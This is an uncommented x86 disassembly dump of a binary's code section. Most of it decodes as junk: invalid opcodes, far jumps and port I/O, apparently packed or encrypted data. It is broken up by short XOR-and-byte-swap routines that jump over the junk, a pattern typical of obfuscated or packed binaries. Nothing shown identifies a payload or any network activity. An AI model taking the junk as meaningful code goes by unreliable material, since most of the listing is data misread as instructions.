  404a70:	mov    ds:0x85cee999,al
  404a75:	jno    0x404adb
  404a77:	sub    eax,0x3106a7d5
  404a7c:	xchg   edi,eax
  404a7d:	repnz (bad) 
  404a7f:	retf   0x26ed
  404a82:	add    BYTE PTR [ecx+0x572deb79],0xf4
  404a89:	adc    ebp,esi
  404a8b:	mov    bl,0x8b
  404a8d:	imul   edx,edx,0xffffffb6
  404a90:	nop
  404a91:	ss mov ebp,0xe8983f79
  404a97:	xchg   ebp,eax
  404a98:	dec    ebx
  404a99:	adc    BYTE PTR [eax],al
  404a9b:	inc    ebx
  404a9c:	out    dx,eax
  404a9d:	cli    
  404a9e:	out    0xdb,al
  404aa0:	jb     0x404aa7
  404aa2:	out    0x59,al
  404aa4:	clc    
  404aa5:	mov    DWORD PTR fs:[ebp-0xc],0xf89c8532
  404aad:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x893c6a28
  404b32:	or     bh,BYTE PTR [ebx+0x7e22a266]
  404b38:	jle    0x404b92
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404ace
  404b3e:	dec    ebx
  404b3f:	push   ds
  404b40:	cmp    eax,DWORD PTR [ecx]
  404b42:	xchg   esi,eax
  404b43:	add    eax,0x6869804c
  404b48:	ds hlt 
  404b4a:	dec    edi
  404b4b:	in     eax,0xe2
  404b4d:	adc    eax,0x114c707a
  404b52:	xor    DWORD PTR [ecx+0x5fe2a9c0],edx
  404b58:	push   ds
  404b59:	fistp  DWORD PTR [ecx-0x63abe889]
  404b5f:	aam    0xe3
  404b61:	ret    
  404b62:	sub    bl,dl
  404b64:	sub    ebp,DWORD PTR [edi+0x7b]
  404b67:	(bad)  
  404b68:	popf   
  404b69:	jmp    0x404b56
  404b6b:	inc    ebp
  404b6c:	mov    cl,0x6
  404b6e:	push   ss
  404b6f:	mov    ebx,0xace10620
  404b74:	sbb    DWORD PTR [ebx-0x35dba75a],ecx
  404b7a:	mov    dl,0xd0
  404b7c:	das    
  404b7d:	es jl  0x404b21
  404b80:	cmp    ebx,DWORD PTR [ebx-0x53e301b8]
  404b86:	in     eax,0x53
  404b88:	sub    BYTE PTR [eax-0x40],0xe7
  404b8c:	div    esi
  404b8e:	mov    ebp,0xc4bcb2f9
  404b93:	push   edi
  404b94:	mov    esi,0xb0085368
  404b99:	sub    BYTE PTR [edx+0x26ee3bf2],dh
  404b9f:	push   ebp
  404ba0:	mov    eax,ds:0x13304f3a
  404ba5:	icebp  
  404ba6:	pusha  
  404ba7:	popa   
  404ba8:	or     bl,BYTE PTR [edi+0x27]
  404bab:	mov    cl,0xb2
  404bad:	leave  
  404bae:	clc    
  404baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bb0:	aas    
  404bb1:	imul   DWORD PTR [ebx+0x36d651a7]
  404bb7:	(bad)  
  404bb9:	push   ds
  404bba:	lea    edi,[edi+0x13a282c4]
  404bc0:	add    DWORD PTR [ebp+0x60],0xf799f995
  404bc7:	aaa    
  404bc8:	and    DWORD PTR [esi-0x16],0x94c3b53d
  404bcf:	lds    esp,FWORD PTR [eax+0x2]
  404bd2:	test   esi,esp
  404bd4:	inc    esi
  404bd5:	icebp  
  404bd6:	aad    0x32
  404bd8:	imul   ecx,DWORD PTR [esi+0x54f61e14],0xd3831455
  404be2:	xor    al,0x2d
  404be4:	out    dx,eax
  404be5:	ja     0x404b77
  404be7:	push   eax
  404be8:	xor    BYTE PTR cs:[esi-0x6ad96f3d],ch
  404bef:	mov    dh,bl
  404bf1:	jg     0x404be3
  404bf3:	xor    ecx,DWORD PTR [bx+si]
  404bf6:	add    BYTE PTR [edi],0xbc
  404bf9:	pop    ss
  404bfa:	add    ch,0xbb
  404bfd:	push   ss
  404bfe:	jl     0x404bb8
  404c00:	adc    esi,DWORD PTR [esi+0x2764160b]
  404c06:	dec    edx
  404c07:	dec    edi
  404c08:	bswap  edi
  404c0a:	(bad)  
  404c0b:	dec    eax
  404c0c:	xor    BYTE PTR [edi-0x71],bl
  404c0f:	push   eax
  404c10:	rcl    al,cl
  404c12:	jae    0x404c29
  404c14:	push   ss
  404c15:	mov    ebx,0xc39f1df1
  404c1a:	dec    eax
  404c1b:	pop    esi
  404c1c:	pop    eax
  404c1d:	popf   
  404c1e:	sbb    eax,0xe9280442
  404c23:	push   ebp
  404c24:	cmp    DWORD PTR [ebx+ecx*4],esp
  404c27:	das    
  404c28:	jb     0x404ca2
  404c2a:	adc    al,cl
  404c2c:	ins    DWORD PTR es:[edi],dx
  404c2d:	xchg   ebp,eax
  404c2e:	mov    bl,0xae
  404c30:	(bad)  [edx]
  404c32:	xor    edi,DWORD PTR [ebx+0x6840a66b]
  404c38:	or     bl,dl
  404c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c3b:	cmp    bh,ah
  404c3d:	jp     0x404c4a
  404c3f:	add    ebx,esi
  404c41:	mov    ecx,0x6afa1b24
  404c46:	fsubr  DWORD PTR [ecx]
  404c48:	imul   edx,DWORD PTR [esi],0xffffffc9
  404c4b:	ja     0x404c09
  404c4d:	mov    edi,0x44d7205a
  404c52:	int3   
  404c53:	push   ecx
  404c54:	jae    0x404bf2
  404c56:	(bad)  
  404c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c58:	jecxz  0x404c9f
  404c5a:	inc    esp
  404c5b:	mov    ebp,0xaf12505a
  404c60:	je     0x404c91
  404c62:	mov    eax,ds:0xac29b36a
  404c67:	mov    ebp,0x2f288bad
  404c6c:	sub    eax,0x96d770bd
  404c71:	aam    0x47
  404c73:	cmp    eax,0x75bf193f
  404c78:	xchg   DWORD PTR [ecx+0x5c],esi
  404c7b:	add    ebx,DWORD PTR [eax+0x65]
  404c7e:	ja     0x404c78
  404c80:	xchg   edx,eax
  404c81:	add    eax,0x1992381c
  404c86:	adc    dh,0xc7
  404c89:	cmp    DWORD PTR [ebx],edi
  404c8b:	pop    es
  404c8c:	out    dx,eax
  404c8d:	jmp    0x1551:0xfe1459ee
  404c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c95:	pusha  
  404c96:	push   ebx
  404c97:	xchg   BYTE PTR [ebx+edi*1-0xf],ch
  404c9b:	xchg   ecx,eax
  404c9c:	inc    BYTE PTR [ecx]
  404c9e:	jecxz  0x404cc9
  404ca0:	pop    ebp
  404ca1:	cmc    
  404ca2:	imul   DWORD PTR [esi-0x3]
  404ca5:	jecxz  0x404cd0
  404ca7:	mov    ch,ch
  404ca9:	scas   al,BYTE PTR es:[edi]
  404caa:	cmp    eax,DWORD PTR [edx+0x110b4341]
  404cb0:	cdq    
  404cb1:	sbb    eax,esi
  404cb3:	inc    ecx
  404cb4:	rcr    BYTE PTR [ebx+0x6baa1336],0xf4
  404cbb:	mov    ?,WORD PTR [edx+0x5f]
  404cbe:	xchg   edx,eax
  404cbf:	clc    
  404cc0:	mov    ah,0x52
  404cc2:	dec    edx
  404cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc4:	add    al,0x85
  404cc6:	xchg   edi,eax
  404cc7:	push   esi
  404cc8:	push   es
  404cc9:	enter  0x805f,0x61
  404ccd:	cmp    DWORD PTR [eax+ecx*2],esp
  404cd0:	xchg   BYTE PTR [ebp-0x20],dl
  404cd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cd4:	mov    al,0x8f
  404cd6:	sbb    al,0x1b
  404cd8:	out    0xac,al
  404cda:	retf   
  404cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cdc:	push   ss
  404cdd:	retf   
  404cde:	sbb    eax,0x794e6c33
  404ce3:	fmul   DWORD PTR [ebx-0x10e4dde2]
  404ce9:	sbb    BYTE PTR [esi+0x1aab5393],0x9c
  404cf0:	std    
  404cf1:	mov    DWORD PTR [eax-0xb],ecx
  404cf4:	dec    esp
  404cf5:	fidivr DWORD PTR [esi-0x11]
  404cf8:	sti    
  404cf9:	xlat   BYTE PTR ds:[ebx]
  404cfa:	push   ds
  404cfb:	and    BYTE PTR [edi-0x684d114d],ah
  404d01:	popa   
  404d02:	dec    ebx
  404d03:	in     eax,dx
  404d04:	adc    BYTE PTR [edx],0x29
  404d07:	jno    0x404c8e
  404d09:	pop    ebp
  404d0a:	push   esp
  404d0c:	mov    dh,0xe5
  404d0e:	jmp    0x404d82
  404d10:	call   0xc60e:0xb5f94bcd
  404d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d18:	push   ebp
  404d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d1a:	outs   dx,DWORD PTR ds:[esi]
  404d1b:	push   ebx
  404d1c:	ja     0x404d81
  404d1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d1f:	mov    esp,DWORD PTR [eax]
  404d21:	lea    esi,[esi+edi*1-0x12]
  404d25:	shr    ebx,0x91
  404d28:	fwait
  404d29:	arpl   WORD PTR [edx],si
  404d2b:	pop    ebp
  404d2c:	add    al,0x50
  404d2e:	adc    eax,0xc5ea3e3
  404d33:	and    eax,0x15a027f6
  404d38:	push   DWORD PTR [eax+0x4b78f988]
  404d3e:	xor    bh,BYTE PTR [eax]
  404d40:	push   ecx
  404d41:	jecxz  0x404ced
  404d43:	xchg   ecx,eax
  404d44:	rcr    BYTE PTR [edi],0x57
  404d47:	jnp    0x404dbd
  404d49:	arpl   WORD PTR [edi+0x63e9565e],bx
  404d4f:	cmp    eax,0xed1bffa2
  404d54:	fdivr  QWORD PTR [edx-0x740d2602]
  404d5a:	nop
  404d5b:	daa    
  404d5c:	mov    al,0x9d
  404d5e:	pop    esp
  404d5f:	popa   
  404d60:	push   edx
  404d61:	dec    ebp
  404d62:	mov    bh,0xe0
  404d64:	sub    BYTE PTR [ecx-0x12],dl
  404d67:	mov    bl,0x86
  404d69:	mov    edx,0x7476c63c
  404d6e:	inc    eax
  404d6f:	jp     0x404db2
  404d71:	sar    edi,1
  404d73:	test   DWORD PTR [esi-0x73],ebx
  404d76:	xor    ecx,eax
  404d78:	add    al,0x3d
  404d7a:	ds mov bh,0x42
  404d7d:	and    al,ah
  404d7f:	pushf  
  404d80:	mov    ebx,0x9e79e109
  404d85:	and    eax,0x1f1b3ccf
  404d8a:	sahf   
  404d8b:	mov    ch,0x72
  404d8d:	xchg   esi,eax
  404d8e:	add    DWORD PTR ds:0x547c7c8c,edx
  404d94:	leave  
  404d95:	mov    eax,ds:0xd004f946
  404d9a:	add    edi,esp
  404d9c:	cld    
  404d9d:	les    ebx,FWORD PTR [ebx+0x487a3e1c]
  404da3:	in     eax,0x15
  404da5:	(bad)  
  404da6:	sbb    ch,BYTE PTR [ecx+0x4f]
  404da9:	add    DWORD PTR [esi-0x27],esi
  404dac:	loopne 0x404da9
  404dae:	jl     0x404dff
  404db0:	sbb    bh,BYTE PTR [eax+0x1c]
  404db3:	aas    
  404db4:	dec    ebx
  404db5:	sub    eax,0x9f20d0f8
  404dba:	je     0x404d74
  404dbc:	xchg   DWORD PTR ds:0x49b0b126,edx
  404dc2:	lea    eax,[ecx+0x4b]
  404dc5:	push   edx
  404dc6:	inc    edx
  404dc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dc8:	mov    WORD PTR [edx+0x58],fs
  404dcb:	jnp    0x404daa
  404dcd:	jl     0x404e3b
  404dcf:	cmc    
  404dd0:	fnstenv [eax+0x37]
  404dd3:	jns    0x404dfe
  404dd5:	sub    DWORD PTR [edi],ebp
  404dd7:	mov    ecx,DWORD PTR ds:[edi+0x36f20f33]
  404dde:	and    eax,0xc872917c
  404de3:	cmp    edi,esp
  404de5:	call   0x70a2:0xbf4a976a
  404dec:	mov    esi,0x992e24ba
  404df1:	add    edi,DWORD PTR [ebx+0x9]
  404df4:	xor    dl,cl
  404df6:	push   edx
  404df7:	pop    ebp
  404df8:	cmp    al,0x93
  404dfa:	cmp    ch,bh
  404dfc:	fdivp  st(0),st
  404dfe:	xchg   edi,eax
  404dff:	or     ebx,esp
  404e01:	ja     0x404e68
  404e03:	dec    esp
  404e04:	xor    DWORD PTR [ebx-0x6bea6ab5],edx
  404e0a:	jne    0x404e22
  404e0c:	pop    ds
  404e0d:	xor    BYTE PTR [eax+0x5b],ah
  404e10:	xlat   BYTE PTR ds:[ebx]
  404e11:	out    dx,al
  404e12:	or     eax,0x79c27025
  404e17:	mov    dl,BYTE PTR [ebp+0x6838179a]
  404e1d:	(bad)  
  404e1e:	fst    DWORD PTR [eax+0x1a]
  404e21:	in     eax,dx
  404e22:	pushf  
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404eab
  404e5e:	in     al,0x37
  404e60:	(bad)  
  404e61:	mov    WORD PTR [ecx],fs
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404edf
  404e6a:	mov    edi,DWORD PTR ds:0x65f5ea46
  404e70:	lock jmp 0x404ec8
  404e73:	popa   
  404e74:	jg     0x404eaf
  404e76:	pop    ecx
  404e77:	and    DWORD PTR [ebp+edx*2-0x5c],edi
  404e7b:	mov    eax,ds:0xe13c3bbd
  404e80:	push   0x67
  404e82:	xchg   BYTE PTR [esi-0x3124d709],dh
  404e88:	es sub al,0xe8
  404e8b:	iret   
  404e8c:	aaa    
  404e8d:	inc    ecx
  404e8e:	in     al,0x52
  404e90:	xchg   esi,eax
  404e91:	sbb    BYTE PTR ds:0xa936d6d0,bl
  404e97:	mov    ebx,0x8313615f
  404e9c:	enter  0xf682,0x92
  404ea0:	sub    ebx,DWORD PTR [eax]
  404ea2:	out    dx,eax
  404ea3:	mov    ch,0x5e
  404ea5:	and    al,0x11
  404ea7:	add    esp,esi
  404ea9:	int    0xb1
  404eab:	xor    WORD PTR [eax],cx
  404eae:	add    ebp,DWORD PTR [eax]
  404eb0:	cmp    eax,0x14f7dca4
  404eb5:	cmp    eax,0xca587d8f
  404eba:	pushf  
  404ebb:	push   edi
  404ebc:	sbb    eax,esi
  404ebe:	mov    al,ds:0x2fcb0622
  404ec3:	and    DWORD PTR [ecx+0x33],esi
  404ec6:	loop   0x404ece
  404ec8:	jmp    0x306f06a0
  404ecd:	adc    DWORD PTR [esi-0x37],eax
  404ed0:	scas   eax,DWORD PTR es:[edi]
  404ed1:	push   ebx
  404ed2:	call   0xd7113be4
  404ed7:	mov    ah,0xb6
  404ed9:	push   eax
  404eda:	fwait
  404edb:	bound  ebx,QWORD PTR [ebp-0x4d]
  404ede:	clc    
  404edf:	mov    esi,0xac35e29f
  404ee4:	jbe    0x404e9b
  404ee6:	mov    cl,BYTE PTR [esi-0x27d98531]
  404eec:	push   0x7c
  404eee:	or     ebp,DWORD PTR [eax+ecx*8]
  404ef1:	je     0x404f6f
  404ef3:	dec    eax
  404ef4:	leave  
  404ef5:	aam    0x88
  404ef7:	neg    DWORD PTR [eax]
  404ef9:	mov    ebp,ebp
  404efb:	ins    DWORD PTR es:[edi],dx
  404efc:	cs push ss
  404efe:	dec    DWORD PTR [esi]
  404f00:	sahf   
  404f01:	int    0xe9
  404f03:	xor    eax,0x439781c1
  404f08:	in     al,dx
  404f09:	cmp    BYTE PTR [si],cl
  404f0c:	fsubr  DWORD PTR [ebx-0xec4904b]
  404f12:	sahf   
  404f13:	shl    BYTE PTR [ecx],cl
  404f15:	scas   eax,DWORD PTR es:[edi]
  404f16:	mov    bl,0x9b
  404f18:	inc    ebx
  404f19:	fs cld 
  404f1b:	push   eax
  404f1c:	adc    esi,DWORD PTR [edx]
  404f1e:	lods   al,BYTE PTR ds:[esi]
  404f1f:	pop    ebp
  404f20:	addr16 jmp 0x404f90
  404f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f24:	push   ebx
  404f25:	pop    edi
  404f26:	xor    ebx,DWORD PTR [esi-0x50f6cb5a]
  404f2c:	mov    bl,BYTE PTR ds:0xe6e22588
  404f32:	stc    
  404f33:	push   es
  404f34:	(bad)  
  404f35:	xlat   BYTE PTR ds:[ebx]
  404f36:	sbb    dh,BYTE PTR [edx-0x5e68b1d2]
  404f3c:	je     0x404f28
  404f3e:	in     eax,0xce
  404f40:	test   eax,ecx
  404f42:	(bad)  
  404f43:	push   cs
  404f44:	sbb    al,BYTE PTR [esi+0x25094d7]
  404f4a:	int3   
  404f4b:	retf   0xcc0d
  404f4e:	popf   
  404f4f:	lahf   
  404f50:	aam    0x1b
  404f52:	mov    dl,0x2e
  404f54:	sar    BYTE PTR [eax+0x3f03b22f],cl
  404f5a:	xor    eax,0x6a062bf3
  404f5f:	mov    bl,0xd
  404f61:	loopne 0x404f45
  404f63:	mov    ebx,0xc5e4a4d6
  404f68:	dec    esp
  404f69:	add    DWORD PTR ss:[eax+0x47d463c1],edi
  404f70:	aad    0x12
  404f72:	add    eax,0xf506277a
  404f77:	in     al,dx
  404f78:	fidiv  WORD PTR [eax+0x703c4c36]
  404f7e:	test   al,0xcf
  404f80:	dec    ebx
  404f81:	mov    ecx,0x77758275
  404f86:	inc    ebx
  404f87:	jmp    0x1ceb3524
  404f8c:	add    eax,0x33ed3a6f
  404f91:	jnp    0x404f9e
  404f93:	push   cs
  404f94:	pop    eax
  404f95:	and    bh,BYTE PTR [esi-0x53]
  404f98:	int3   
  404f99:	sub    bl,BYTE PTR [edx+0x14]
  404f9c:	sub    esi,DWORD PTR [ebp-0x5e]
  404f9f:	push   es
  404fa0:	(bad)  
  404fa3:	and    BYTE PTR [ebx],al
  404fa5:	or     ecx,DWORD PTR [eax+0x4656e5d3]
  404fab:	ja     0x404fc0
  404fad:	adc    al,0xed
  404faf:	and    dl,BYTE PTR [ebp+esi*4+0x17]
  404fb3:	add    ebx,esi
  404fb5:	imul   ebx,ebx,0xa40f0030
  404fbb:	mov    ebx,esp
  404fbd:	stos   BYTE PTR es:[edi],al
  404fbe:	adc    ch,BYTE PTR [edx-0x79]
  404fc1:	mov    BYTE PTR [ebp-0x7ce06871],bl
  404fc7:	cmp    BYTE PTR [ecx+0x3e],dl
  404fca:	and    al,0x5a
  404fcc:	push   ebp
  404fcd:	ret    0xc02c
  404fd0:	pushf  
  404fd1:	in     eax,dx
  404fd2:	fistp  QWORD PTR [ebx+ebp*1]
  404fd5:	leave  
  404fd6:	scas   al,BYTE PTR es:[edi]
  404fd7:	inc    ebp
  404fd8:	and    BYTE PTR [ebx],ch
  404fda:	(bad)  
  404fdb:	pop    ebx
  404fdc:	pop    esi
  404fdd:	ins    DWORD PTR es:[edi],dx
  404fde:	mov    bl,0x88
  404fe0:	and    al,0xc4
  404fe2:	stc    
  404fe3:	fdiv   DWORD PTR [ecx-0x6e]
  404fe6:	imul   ebp,DWORD PTR [ebx-0x43],0xffffff9f
  404fea:	fprem  
  404fec:	sub    ch,cl
  404fee:	ins    BYTE PTR es:[edi],dx
  404fef:	mov    ebx,0xd2efe88a
  404ff4:	xor    eax,0x11d53998
  404ff9:	mov    WORD PTR [esi+ebx*8+0x15],ds
  404ffd:	out    dx,al
  404ffe:	or     al,0x64
  405000:	and    bl,dh
  405002:	adc    bl,dl
  405004:	cmp    eax,0x26b4f077
  405009:	dec    ebp
  40500a:	mov    ebp,0xaa45c3c2
  40500f:	add    al,0x0
  405011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405012:	push   0x917b8632
  405017:	cmp    ebx,esi
  405019:	or     eax,0xb79cd78
  40501e:	test   DWORD PTR [edx+eax*8+0x7c],eax
  405022:	std    
  405023:	in     eax,0x21
  405025:	push   esi
  405026:	sub    cl,BYTE PTR [edi+edx*8+0x4b]
  40502a:	sub    al,BYTE PTR ds:0x87ba1a5e
  405030:	mov    al,ds:0x8dbb206f
  405035:	mov    esp,0x6c8b3e42
  40503a:	pushf  
  40503b:	and    bh,BYTE PTR [esi+0x71022069]
  405041:	inc    edx
  405042:	inc    ecx
  405043:	test   al,al
  405045:	sub    al,0xe0
  405047:	out    0x35,eax
  405049:	stos   DWORD PTR es:[edi],eax
  40504a:	into   
  40504b:	and    BYTE PTR [esp+ebx*4],al
  40504e:	aad    0x32
  405050:	imul   esi,eax,0xa0f56a34
  405056:	mov    dh,0x65
  405058:	fadd   QWORD PTR [edi+0x68]
  40505b:	iret   
  40505c:	adc    al,0xe
  40505e:	sbb    eax,0xf31a2df5
  405063:	push   esi
  405064:	es loope 0x4050e0
  405067:	cmp    eax,0xcdc3b0ea
  40506c:	div    BYTE PTR [ebp-0x45]
  40506f:	retf   
  405070:	mov    ds:0x7cc091af,al
  405075:	mov    bh,0xfc
  405077:	test   eax,0xdcfdd48a
  40507c:	mov    edi,es
  40507e:	cmp    al,0xb1
  405080:	in     eax,0xd0
  405082:	cmp    eax,0xd30f7305
  405087:	lea    edx,[ebx]
  405089:	add    al,0x56
  40508b:	adc    eax,0xb2029af
  405090:	mov    ebp,0xc981d679
  405095:	jle    0xb0efcd3d
  40509b:	addr16 mov bl,0xdd
  40509e:	lds    edx,FWORD PTR [esi]
  4050a0:	or     al,0x10
  4050a2:	sar    DWORD PTR [ebx+0x9],cl
  4050a5:	rol    BYTE PTR [edi+ebp*8+0x30],1
  4050a9:	jbe    0x405093
  4050ab:	(bad)  
  4050ac:	push   ebx
  4050ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050ae:	sub    eax,0xbe7259a6
  4050b3:	add    al,0x6c
  4050b5:	gs adc al,0x9b
  4050b8:	push   es
  4050b9:	call   0x4ed5:0xa0001196
  4050c0:	pop    esp
  4050c1:	sbb    edx,DWORD PTR [eax+edx*1+0x29]
  4050c5:	add    BYTE PTR [esi-0x23],0x48
  4050c9:	cli    
  4050ca:	scas   eax,DWORD PTR es:[edi]
  4050cb:	mov    edi,0x7bb508bd
  4050d0:	and    eax,0x6f9cee1
  4050d5:	inc    eax
  4050d6:	fsub   QWORD PTR [eax]
  4050d8:	add    eax,0x15190be7
  4050dd:	sbb    BYTE PTR [eax-0x1b],cl
  4050e0:	jne    0x40507e
  4050e2:	lea    esi,[esi]
  4050e4:	mov    esi,ebx
  4050e6:	xor    ecx,DWORD PTR [edx+0x24]
  4050e9:	xlat   BYTE PTR ds:[ebx]
  4050ea:	cmp    edx,esp
  4050ec:	cmp    bl,BYTE PTR fs:[ecx]
  4050ef:	inc    edi
  4050f0:	xor    ecx,DWORD PTR [ebx+0x58a9411d]
  4050f6:	das    
  4050f7:	cli    
  4050f8:	adc    eax,DWORD PTR [eax-0xf]
  4050fb:	(bad)  
  4050fc:	popa   
  4050fd:	dec    ebp
  4050fe:	xor    ch,BYTE PTR [eax+0x3e]
  405101:	ins    DWORD PTR es:[edi],dx
  405102:	stos   BYTE PTR es:[edi],al
  405103:	cmp    ebx,DWORD PTR [eax]
  405105:	or     BYTE PTR [ebx],0x2c
  405108:	jg     0x40516d
  40510a:	daa    
  40510b:	push   eax
  40510c:	and    al,0xf5
  40510e:	sbb    BYTE PTR [eax+0x58d9633b],bh
  405114:	mov    ds:0xbef75406,al
  405119:	jmp    0x4b07:0xee2997a7
  405120:	nop
  405121:	frstor [ebx-0x2f]
  405124:	sub    BYTE PTR [esi+0x47d3b31],bl
  40512a:	sahf   
  40512b:	add    ecx,esp
  40512d:	rol    DWORD PTR [edi+0x4071d993],cl
  405133:	sbb    ah,dh
  405135:	or     eax,0x99df65be
  40513a:	popa   
  40513b:	es pop esp
  40513d:	sbb    BYTE PTR ss:[ebx-0x7a93f341],bl
  405144:	scas   al,BYTE PTR es:[edi]
  405145:	cs or  al,0x41
  405148:	popf   
  405149:	pop    eax
  40514a:	sub    ecx,DWORD PTR [ebx+0x64]
  40514d:	adc    al,0x4e
  40514f:	imul   edi,ebx
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	push   0x49
  405173:	sub    edx,DWORD PTR [esi+esi*8+0x2c]
  405177:	jle    0x4051f7
  405179:	pop    eax
  40517a:	jl     0x4051fa
  40517c:	jle    0x40515f
  40517e:	push   cs
  40517f:	sub    DWORD PTR [ebx+0x77],ebp
  405182:	enter  0xcba2,0xe8
  405186:	fs and eax,0x708fb472
  40518c:	and    eax,0xe2d74ce8
  405191:	push   esp
  405192:	xchg   edx,eax
  405193:	pop    ebx
  405194:	push   esi
  405195:	outs   dx,BYTE PTR ds:[esi]
  405196:	leave  
  405197:	pop    ecx
  405198:	repnz sub cl,ah
  40519b:	sub    DWORD PTR [ebx+0x4aafbc60],eax
  4051a1:	pop    edi
  4051a2:	aas    
  4051a3:	pop    esi
  4051a4:	and    DWORD PTR [edi+0x2e],esp
  4051a7:	(bad)  
  4051a8:	sub    DWORD PTR [esi-0x23],esp
  4051ab:	test   DWORD PTR [ebx],eax
  4051ad:	mov    dh,BYTE PTR [eax-0x1f]
  4051b0:	ror    bh,1
  4051b2:	sti    
  4051b3:	addr16 pop edi
  4051b5:	cdq    
  4051b6:	jne    0x40518e
  4051b8:	lds    edi,FWORD PTR [edi-0x4c0141fb]
  4051be:	pop    ecx
  4051bf:	push   esp
  4051c0:	mov    bl,0x39
  4051c2:	(bad)  
  4051c3:	push   0xd03e8bb3
  4051c8:	inc    edi
  4051c9:	shl    esp,0x23
  4051cc:	ins    BYTE PTR es:[edi],dx
  4051cd:	mov    al,ds:0x6e456c75
  4051d2:	cmp    ebp,DWORD PTR [esi-0x4d]
  4051d5:	add    al,0x67
  4051d7:	jl     0x4051a2
  4051d9:	nop
  4051da:	loopne 0x405218
  4051dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051dd:	ins    DWORD PTR es:[edi],dx
  4051de:	dec    esp
  4051df:	mov    al,0xf3
  4051e1:	sahf   
  4051e2:	shl    DWORD PTR [edi-0x65],0x96
  4051e6:	push   es
  4051e7:	mov    eax,DWORD PTR [edi+edi*1+0x45]
  4051eb:	stos   DWORD PTR es:[edi],eax
  4051ec:	mov    eax,0x28b8a568
  4051f1:	outs   dx,BYTE PTR ds:[esi]
  4051f2:	mov    bl,BYTE PTR [edi]
  4051f4:	xor    al,BYTE PTR [ecx]
  4051f6:	xor    dl,0x25
  4051f9:	(bad)  
  4051fa:	repz in eax,dx
  4051fc:	shr    BYTE PTR [ebp+0x2b],cl
  4051ff:	or     BYTE PTR [edi],0x4d
  405202:	xchg   ebp,eax
  405203:	rcr    esi,cl
  405205:	nop
  405206:	out    dx,eax
  405207:	push   esi
  405209:	sti    
  40520a:	mov    esp,0xdd1c1c57
  40520f:	daa    
  405210:	dec    edi
  405211:	mov    eax,0xa7b832fe
  405216:	push   ss
  405217:	xchg   edi,eax
  405218:	rcl    DWORD PTR [ecx],0xf2
  40521b:	jae    0x4051b2
  40521d:	fsubr  DWORD PTR [edx*8-0x5a90c1aa]
  405224:	jmp    0xb5ef:0xc8482edd
